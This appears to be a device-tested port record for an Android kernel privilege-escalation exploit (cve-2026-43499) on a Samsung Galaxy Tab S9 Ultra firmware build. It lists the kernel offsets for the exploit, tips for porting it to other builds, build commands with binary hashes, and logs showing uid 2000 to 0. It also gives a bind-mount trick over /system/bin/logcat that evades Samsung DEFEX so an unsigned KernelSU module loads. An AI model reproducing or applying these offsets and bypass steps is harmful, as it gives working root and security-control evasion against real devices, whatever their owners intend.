# Galaxy Tab S9 Ultra SM-X916B / X916BXXS6EZI2 — device-tested port record

Port of the hardware-proven `gts9u-X916BXXS6EZG3` profile to build **X916BXXS6EZI2**.
**Full root was achieved and verified on real hardware 2026-11-12** (three independent
sessions, always attempt 1/8), plus **KernelSU late-load LKM working** (Manager reports
`Working <LKM> [Jailbreak mode]`, version 32525-2, SELinux Enforcing).

## Device identity

```text
model: SM-X916B (Galaxy Tab S9 Ultra 5G, Snapdragon 8 Gen 2 / Kalama SM8550)
device: gts9u
region/CSC: EGY (X916BOXM6EZI2)
AP/PDA build: X916BXXS6EZI2
display build: BP4A.251205.006.X916BXXS6EZI2
fingerprint: samsung/gts9uxeea/gts9u:16/BP4A.251205.006/X916BXXS6EZI2:user/release-keys
security patch level: 2026-09-05
kernel release: 5.15.189-android13-8-33413632-abX916BXXS6EZI2
Android version: 16 (One UI 8.5)
bootloader/verified boot: locked, green (stock, unmodified throughout; warranty_bit=0 after all testing)
```

Same Kalama/SM8550 platform, same `5.15.189` kernel family as the merged
`gts9u-X916BXXS6EZG3` profile; no offset was assumed equal to EZG3 without
independent verification against this build's own kernel image.

## Engine base

Identical to the EZG3 record: MCAST/SIGRETURN stack-writer engine
(PR #227 stack), `pselect6` route not used (see EZG3 record for why).

## Derived offsets (vmlinux-to-elf on this build's own boot.img)

`vmlinux-to-elf` recovered kallsyms directly from the Android-v4 boot image
(raw ARM64 Image at page 4096, base `0xffffffc008000000`; the kernel is **not**
compressed on this device and contains **no BTF blob** — struct-layout
constants are carried from the same-kernel-version EZG3 family and flagged
`UNVERIFIED-BTF` in `target.h`).

| Macro | EZG3 | EZI2 | Δ |
| --- | --- | --- | --- |
| INIT_TASK_OFF | 0x02c05080 | 0x02c050c0 | +0x40 |
| KMALLOC_CACHES_OFF | 0x020646b8 | 0x02064d78 | +0x6c0 |
| ANON_PIPE_BUF_OPS_OFF | 0x01e7f6a0 | 0x01e7fd60 | +0x6c0 |
| ASHMEM_FOPS_OFF | 0x0200d6f8 | 0x0200ddb8 | +0x6c0 |
| ASHMEM_MISC_FOPS_OFF | 0x02bfcf28 | **0x02bfcf78** | +0x50, see below |
| ASHMEM_IOCTL_OFF | 0x0114c6dc | 0x0114cb1c | +0x440 |
| ASHMEM_COMPAT_IOCTL_OFF | 0x0114cd38 | **0x0114d178** | renamed fn, see below |
| ASHMEM_MMAP_OFF | 0x0114cd90 | 0x0114d1d0 | +0x440 |
| ASHMEM_OPEN_OFF | 0x0114d070 | 0x0114d4b0 | +0x440 |
| ASHMEM_RELEASE_OFF | 0x0114d108 | 0x0114d548 | +0x440 |
| ASHMEM_SHOW_FDINFO_OFF | 0x0114d224 | 0x0114d664 | +0x440 |
| CONFIGFS_READ_ITER_OFF | 0x005d7420 | 0x005d74b8 | +0x98 |
| CONFIGFS_BIN_WRITE_ITER_OFF | 0x005d7e48 | 0x005d7ee0 | +0x98 |
| SLIDE_NFULNL_LOGGER_NAME_OFF | 0x01d5df02 | 0x001d5e4e7 | string moved; sole `nfnetlink_log\0` hit |
| SLIDE_TRACEFS_WORKER_CALLER_OFF | 0x0010db44 | 0x0010db44 | same (verified by disassembly) |

**Unchanged (verified identical)**: prepare/commit/override_creds,
root_task_group, selinux_state, system_unbound_wq,
call_usermodehelper_exec_work, noop_llseek, nfulnl_logger object,
random_table boot_id pointer (0x2bba9c8), sysctl bootid (0x2e6c0b1).

### Two porting traps this build introduced

1. **`compat_ioctl` was renamed**: EZI2 has `compat_ashmem_ioctl` at a
   different address instead of EZG3's `ashmem_compat_ioctl`. Do not port by
   symbol name — read `ashmem_fops+0x58` from the image (`0x114d178`).
2. **`ASHMEM_MISC_FOPS_OFF` moved by +0x50** (0x2bfcf28 → 0x2bfcf78). The
   first hardware run with the copied EZG3 constant passed the write stage but
   failed CFI verification (`cfi misc_fops mismatch read=0`) because the
   engine wrote the fake-fops pointer into an unused neighbour field. Scan the
   whole image for pointers to `ashmem_fops` — there is exactly one
   (`0x2bfcf78`). General rule: **port data anchors by scanning for pointers,
   not by copying constants**, even within the same kernel family.

## Build

NDK r25b (25.1.8937393), macOS host. The Makefile size gate uses GNU
`stat -c`/`truncate`; on macOS compile with `make all`, then pad
`cve-2026-43499-app.release.so` to 104128 bytes manually.

```sh
make TARGET=gts9u-X916BXXS6EZI2 API=33 ANDROID_NDK_HOME=... all
truncate -s 104128 build/gts9u-X916BXXS6EZI2/cve-2026-43499-app.release.so
```

```text
cve-2026-43499-app.so  104128 B  sha256 10bb2acb0c9829319c559f838cb8b3d6c44e9cf0450d4a6bf42595514675fe1b
cve-2026-43499-root    26648 B   sha256 6ac778000735c13f089ba93990590947a677e21961d818405409b9e9b0812fdb
```

## Hardware validation

Eleven one-attempt sessions across reboots: 3× full root (always
`attempt=1/8`, `pipe physrw done=1 root=1 read_ok=1 write_ok=1 uid=2000->0`),
the rest clean CFI mismatches or clean crashes at the writer stage — consistent
with the EZG3 record's "writer stage succeeded about half the time". After
every success: `warranty_bit=0`, `flash.locked=1`, `verifiedbootstate=green`,
`vbmeta.device_state=locked`. The engine refuses retries after a stack-writer
run; reboot before retry.

Root primitive: `cve-2026-43499-root -c '<command>'` (uid=0,
context=`u:r:kernel:s0`).

## KernelSU late-load (solves the issue #336 gap on this hardware)

The 5.15 kernel does not export the SELinux-internal symbols the KSU module
needs, and Samsung **DEFEX** blocks executing unsigned binaries from
`/data` as uid=0 (`[DEFEX] Safeplace violation ... uid=0`). Plain
`/data/local/tmp/ksud insmod` is therefore blocked twice over. The working
recipe reuses the bind-mount trick already proven by
`run_kernelsu_late_load()` in this repo's own `su_daemon.c`:

```sh
# as root from the exploit helper, after pushing ksud + a vermagic-patched .ko:
mount -o bind /data/local/tmp/ksud /system/bin/logcat   # DEFEX sees a trusted path
/system/bin/logcat insmod /data/local/tmp/kernelsu-ezi2.ko
```

Module used: `kernelsu/android13-5.15.189_kernelsu-gts9u-X916BXXS6EZI2.ko` —
the device-tested FZG1 module with the vermagic string patched in place
(`33413713-abS916BXXSAFZG1` → `33413632-abX916BXXS6EZI2`; identical length, so
the ELF binary needs no other change). Static audit against this build's
kernel: **200 undefined imports, 0 missing**.

```text
insmod: Loaded kernel module: /data/local/tmp/kernelsu-ezi2.ko   (rc=0)
/proc/modules: kernelsu 208896 0 - Live (OE)
KernelSU Manager v3.2.5 (32525-2): Working <LKM> [Jailbreak mode]
SELinux: Enforcing    (see docs/SM-X916B-X916BXXS6EZI2-KernelSU.png)
```

Root grant flow is per-app through KernelSU Manager (su_compat/adb_root
features are `NOT_SUPPORTED` in this module build — the minimal Samsung
KDP/RKP config). Root remains per-boot; no boot image was modified.

## Known artifacts from root (research notes)

With root, `steady` (sda15) and `persistent` (sda14) were read in full on this
device. Both hold SPU-encrypted, MAC-protected A/B record copies (steady even
carries an `SPU:5, AR:1` provisioning marker); **no plaintext `ENG` magic
exists anywhere**, confirming the OEM-unlock state is fully SPU-backed and
unreachable from a userspace/kernel root. Partition writes are not a route to
bootloader unlock on this unit.

Use only on devices you own or are explicitly authorized to test.
